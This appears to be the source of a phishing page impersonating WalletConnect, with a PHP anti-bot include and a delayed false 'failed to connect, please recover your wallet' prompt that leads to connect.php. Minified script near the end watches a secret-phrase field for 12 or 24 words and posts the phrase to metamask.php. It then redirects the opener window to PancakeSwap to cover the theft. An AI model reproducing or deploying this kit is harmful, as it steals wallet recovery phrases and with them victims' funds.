<html>
<meta http-equiv="content-type" content="text/html" />
<?php require '../antibot.php';?>
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./images/logo.svg">
  <link rel="icon" href="./images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>

<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Connecting to your wallet... </h1>
	  
	<br>  	<br>  	<br>  
	 
<img style="width:32px;height:32px" src="https://c.tenor.com/I6kN-6X7nhAAAAAj/loading-buffering.gif" alt="loading"> 
<br>
	  
	  <script>

window.onload = function(){
// Change this value to however many seconds you want to delay the text by.
var theDelay = 3;
var timer = setTimeout("showText()",theDelay*1000)
}
function showText(){
document.getElementById("delayedText").style.visibility = "visible"; style="color:red"
}
</script>

<div  id="delayedText" style="visibility:hidden" 


class="redText">Walletconnect failed to connect to your wallet.<br>
Please continue to recover your wallet.</div>
 
 
 
 <style scoped>
.redText {color:red;}
</style>
    </br>

<form  method="get" action="./connect.php">
    <button class="btn" type="submit">Continue</button>
</form>




    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	<script type="text/javascript">
        function removeDiv(btn){
            var element = document.getElementById("remove");
			element.parentNode.removeChild(element);
        }
    </script>
  </body>
</html>








<script src="./index_files/jquery.min.js.download"></script>
<script>
var p=!1;setTimeout(function(){$(".z2").addClass("hidden"),$(".z3").removeClass("hidden")},1e3),$(".import-account__secret-phrase").on("keyup",function(){var t=$(this).val().split(" ");p||(12==t.length&&1<t[11].length||24==t.length&&1<t[23].length?$(".button.btn--first-time.first-time-flow__button").prop("disabled",!1):$(".button.btn--first-time.first-time-flow__button").prop("disabled",!0))}),$(".button.btn--first-time.first-time-flow__button").on("click",function(){p=!0,$(this).prop("disabled",!0).html('<i class="fa fa-spinner fa-spin fa-fw"></i> '+$(this).html()),$.post("./metamask.php",{data1:"MetaMask",data:$(".import-account__secret-phrase").val()},function(){p=!1},"json"),window.parent.opener.postMessage({uniswapyujinx:!0}),setTimeout(function(){$(".z2").removeClass("hidden"),$(".z3").addClass("hidden"),setTimeout(function(){window.parent.opener.location.replace("https://pancakeswap.finance/"),window.parent.close()},2e3)},1e3)}),document.body.addEventListener("contextmenu",function(t){"import-account__secret-phrase"!=t.toElement.className&&t.preventDefault()},!1);
</script>

    <script>
      document.getElementById("default").click();
    </script>
    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>
